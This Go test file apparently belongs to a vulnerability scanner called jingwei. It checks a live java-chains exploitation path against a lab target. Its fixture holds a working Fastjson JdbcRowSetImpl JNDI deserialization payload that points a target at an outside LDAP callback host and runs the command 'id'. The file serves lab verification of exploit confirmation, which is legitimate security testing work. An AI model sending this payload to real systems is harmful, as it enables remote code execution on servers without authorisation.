package server

import (
	"context"
	"fmt"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/Autumn-27/jingwei/db"
	"github.com/Autumn-27/jingwei/scanner"
)

// ---------------------------------------------------------------------------
// java-chains 正路径实测。这两个用例要一个真的 sidecar 容器和一个真的会执行
// JNDI lookup 的靶点，CI 上两者都没有，所以默认 skip；开启方法见
// deploy/JAVA_CHAINS.md「正路径实测」。其余用例都把 MCP 响应当成字符串喂给解析
// 器，证明不了 gadget 链编得起来、LDAP 引用送得出去、回调认得回来 —— 只有这里能。
// ---------------------------------------------------------------------------

// liveJNDIPath 是靶机上的 JNDI 注入点（/root/lab-ubuntu/u1-java-jndi.sh）。
const liveJNDIPath = "/lab/jndi.jsp"

// liveJNDITemplate 照抄仓库里 fastjson POC 的形状：JSON body 的 dataSourceName
// 指向 OAST 占位符。深度任务把占位符换成 java-chains 的 LDAP 地址后投递。
func liveJNDITemplate() db.POCTemplate {
	return db.POCTemplate{
		TemplateID: "jingwei-lab-fastjson-jndi",
		Name:       "Fastjson JdbcRowSetImpl JNDI（实验室夹具）",
		Severity:   "critical",
		Protocol:   "http",
		Tags:       []string{"fastjson", "deserialization", "oast"},
		Content: `id: jingwei-lab-fastjson-jndi
info:
  name: Fastjson JdbcRowSetImpl JNDI
  severity: critical
  tags: fastjson,deserialization,oast
http:
  - raw:
      - |
        POST ` + liveJNDIPath + ` HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{interactsh-url}}/jwlab","autoCommit":true}
`,
	}
}

// liveSidecar returns a client for a reachable sidecar plus the lab target, or
// skips when the operator did not ask for a live run.
func liveSidecar(t *testing.T) (*scanner.JavaChainsClient, scanner.JavaChainsConfig, string) {
	t.Helper()
	cfg := scanner.JavaChainsConfigFromEnv()
	if !cfg.Configured() {
		t.Skip("JAVA_CHAINS_MCP_TOKEN 未设置，跳过 java-chains 正路径实测")
	}
	target := strings.TrimRight(strings.TrimSpace(os.Getenv("JAVA_CHAINS_LIVE_TARGET")), "/")
	if target == "" {
		t.Skip("JAVA_CHAINS_LIVE_TARGET 未设置，跳过 java-chains 正路径实测")
	}
	client := scanner.NewJavaChainsClient(cfg, 25*time.Second)
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	if err := client.JavaChainsStatus(ctx); err != nil {
		t.Fatalf("已配置 java-chains 但 %s 连不上：%v", cfg.BaseURL, err)
	}
	// sidecar 跨任务、跨进程活着，上一次留下的监听配置会一直生效，
	// 所以每个用例都从「服务停着」开始，测的才是本产品自己的建服务路径。
	if err := client.StopJNDI(ctx); err != nil {
		t.Fatalf("停止 JNDI 服务失败，无法给出干净的判定：%v", err)
	}
	return client, cfg, target
}

// liveDeepRun wires a real deep task row so logf/progress/ledger all write
// where the product would write them.
func liveDeepRun(t *testing.T, pg *db.DB, params map[string]any) (*deepRun, int64) {
	t.Helper()
	deep, err := pg.CreateDeepTask(db.DeepTaskInput{
		Name: "java-chains 正路径实测", Kind: db.DeepTaskExploit, Params: params,
	})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		_, _ = pg.Exec(`DELETE FROM exploit_records WHERE task_id=$1`, deep.ID)
		_, _ = pg.Exec(`DELETE FROM managed_resources WHERE owner=$1`, fmt.Sprintf("deep:%d", deep.ID))
		_, _ = pg.Exec(`DELETE FROM deep_tasks WHERE id=$1`, deep.ID)
	})
	s := &Server{m: &Manager{pg: pg}}
	s.resourceMgr = newResourceManager(s)
	return &deepRun{
		s: s, pg: pg, task: deep, ctx: context.Background(),
		progress: map[string]any{}, confirmedFindings: map[int64]bool{},
	}, deep.ID
}

// The shipped positive path: a deserialization POC with an OAST JNDI address
// gets a preset, a published LDAP reference, a rewritten request, and a callback
// that the sidecar logs — so the record says confirmed instead of attempted.
func TestJavaChainsLiveAutoFlowConfirmsCallback(t *testing.T) {
	client, _, target := liveSidecar(t)
	pg := prescanTestDB(t)
	r, taskID := liveDeepRun(t, pg, map[string]any{
		"java_cmd":         "id",
		"java_chains_wait": float64(10),
	})

	summary := map[string]any{}
	confirmed := r.runJavaChains([]db.POCTemplate{liveJNDITemplate()}, target, "exploit", summary)
	if !confirmed[liveJNDITemplate().TemplateID] {
		t.Fatalf("目标明确回连了，模板却未被标记为已确认复现：%+v", summary)
	}
	rec := liveJavaChainsRecord(t, pg, taskID)
	if rec.Verdict != "confirmed" {
		t.Fatalf("verdict = %q，要求 confirmed；证据：%s", rec.Verdict, rec.Evidence)
	}
	if !strings.Contains(rec.Evidence, "outcome=") {
		t.Fatalf("证据要引用 sidecar 的回调日志行，才能复核不是自己宣布的：%s", rec.Evidence)
	}
	if !strings.Contains(rec.Request, "ldap://") || strings.Contains(rec.Request, "{{interactsh-url}}") {
		t.Fatalf("投递的报文里应只剩 java-chains 的 LDAP 地址：\n%s", rec.Request)
	}
	if rec.Response == "" {
		t.Fatal("投递响应没进台账，无法复核目标确实消费了引用")
	}
	if got := summary["java_chains_confirmed"]; got != 1 {
		t.Fatalf("summary.java_chains_confirmed = %v，要求 1", got)
	}

	// 任务结束要把手刚建起来的发布与服务收回去，否则回调端口一直开着。
	if left, err := client.ActiveJNDIPublications(context.Background()); err != nil || left != 0 {
		t.Fatalf("任务结束后仍有 %d 个 JNDI 发布残留（err %v）", left, err)
	}
	svc, err := client.JNDIService(context.Background())
	if err != nil {
		t.Fatalf("读取 JNDI 服务状态失败：%v", err)
	}
	if svc.State != "STOPPED" && svc.State != "DISABLED" && svc.State != "" {
		t.Fatalf("自动任务结束时 JNDI 服务应已停止，实际 %q", svc.State)
	}
	liveCallbackRelease(t, pg, taskID)
}

// A sidecar already running on another interface is the common state (earlier
// task, or someone started JNDI in its Web UI). quick_jndi keeps that bind and
// only reports it back, so without the repair the reference points at a port
// nothing listens on and every attempt silently ends as "未回连".
func TestJavaChainsLiveRepairsStaleListenBind(t *testing.T) {
	client, cfg, target := liveSidecar(t)
	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
	defer cancel()
	if err := client.RestartJNDI(ctx, "127.0.0.1", cfg.CallbackHost); err != nil {
		t.Fatalf("预置 127.0.0.1 监听失败：%v", err)
	}
	svc, err := client.JNDIService(ctx)
	if err != nil {
		t.Fatalf("预置监听后读不到服务状态：%v", err)
	}
	if normalizeListenHost(svc.Bound.Host) != "loopback" {
		t.Fatalf("预置监听未生效：host=%q", svc.Bound.Host)
	}

	pg := prescanTestDB(t)
	r, taskID := liveDeepRun(t, pg, map[string]any{
		"java_bind_host":   "0.0.0.0",
		"java_cmd":         "id",
		"java_chains_wait": float64(10),
	})
	summary := map[string]any{}
	r.runJavaChains([]db.POCTemplate{liveJNDITemplate()}, target, "exploit", summary)
	rec := liveJavaChainsRecord(t, pg, taskID)
	if rec.Verdict != "confirmed" {
		t.Fatalf("遗留监听没有被修好，回连等不到：verdict=%q 证据：%s", rec.Verdict, rec.Evidence)
	}
	after, err := client.JNDIService(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	if normalizeListenHost(after.Bound.Host) != "unspecified" {
		t.Fatalf("服务仍监听在 %q，没有改成要求的 0.0.0.0", after.Bound.Host)
	}
}

// liveJavaChainsRecord pulls the one row the auto flow is supposed to have
// written; nothing here re-reads the sidecar to reach the verdict.
func liveJavaChainsRecord(t *testing.T, pg *db.DB, taskID int64) *db.ExploitRecord {
	t.Helper()
	records, err := pg.ListExploitRecords(taskID)
	if err != nil {
		t.Fatal(err)
	}
	for _, rec := range records {
		if rec.Mode == "java_chains" {
			return rec
		}
	}
	t.Fatalf("深度任务 #%d 没有写下 java-chains 证据行（共 %d 条记录）", taskID, len(records))
	return nil
}

// liveCallbackRelease checks the callback endpoint was released in the ledger,
// which is what evacuation and the port audit read after the task is gone.
func liveCallbackRelease(t *testing.T, pg *db.DB, taskID int64) {
	t.Helper()
	rows, _, err := pg.ListManagedResources(db.ManagedKindCallback, db.ManagedActive, 200, 0)
	if err != nil {
		t.Fatal(err)
	}
	owner := fmt.Sprintf("deep:%d", taskID)
	for _, res := range rows {
		if res.Owner == owner {
			t.Fatalf("回调资源 #%d (%s) 任务结束后仍是 active", res.ID, res.Endpoint)
		}
	}
}
